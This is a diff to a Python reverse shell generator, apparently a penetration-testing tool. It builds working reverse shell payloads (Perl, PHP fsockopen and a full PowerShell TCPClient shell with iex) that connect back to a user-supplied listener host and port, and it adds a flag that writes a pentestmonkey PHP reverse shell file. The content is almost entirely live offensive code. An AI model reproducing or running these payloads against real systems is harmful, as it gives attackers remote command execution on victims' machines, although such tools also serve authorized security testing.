@@ -28,7 +28,7 @@ class Reverse_Shell_Generator:
                         +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                         +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
                  self.Base64() 
-            elif 'php' in self.args.type:
+            elif 'php' in self.args.type and not  self.args.pentestmonkey:
                  self.result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                          +'"'+","+f'{self.args.LPORT}'+");exec("\
                          +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
@@ -53,13 +53,28 @@ class Reverse_Shell_Generator:
             elif 'powershell'  in self.args.type:
                  self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                  self.Base64()
+            elif 'php' in self.args.type  and self.args.pentestmonkey:
+                  if os.path.exists('PHP.php'):
+                     os.remove("PHP.php")
+                  else:
+                       pass
+                  LHOST = "$ip =  '"+f'{self.args.LHOST}'+"';"
+                  LPORT = "$port = "+f'{self.args.LPORT}'+';'
+                  with open ('./resources/pentestmonkey.txt' ,'r') as Monkey:
+                             read_php = Monkey.readlines()
+                  for line in read_php:
+                      line = line.replace("$ip = 'LHOST';",LHOST)
+                      line = line.replace("$port = LPORT;",LPORT)  
+                      with open('PHP.php','a') as PHP_shell :
+                           write_shell = PHP_shell.write(line)       
         def control(self):    
             parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
-            parser.add_argument("-t",'--type'     , metavar='' , action=None  ,help   ="type of payload ") 
-            parser.add_argument("-i","--LHOST"    , metavar='' , action=None  ,required = True ,help   ="listner ip ' Local Host'") 
-            parser.add_argument("-p","--LPORT" , metavar='' , action=None  ,required = True ,help   ="Listner port ")   
-            parser.add_argument("-o","--output"   , metavar='' , action=None                   ,help   ="save the payload into the file")      
-            parser.add_argument("--base64"   , action='store_true'                 ,help   ="encode the payloat to base64 encode ")  
+            parser.add_argument("-t",'--type'            , metavar='' , action=None  ,required = True ,help   ="type of payload ") 
+            parser.add_argument("-i","--LHOST"           , metavar='' , action=None  ,required = True ,help   ="listner ip ' Local Host'") 
+            parser.add_argument("-p","--LPORT"           , metavar='' , action=None  ,required = True ,help   ="Listner port ")   
+            parser.add_argument("-o","--output"          , metavar='' , action=None                   ,help   ="save the payload into the file")      
+            parser.add_argument("-B64","--base64"               , action='store_true'                        ,help   ="encode the payload to base64 encode ")  
+            parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ")  
             self.args = parser.parse_args()        
             if len(sys.argv)!=1 :
                pass
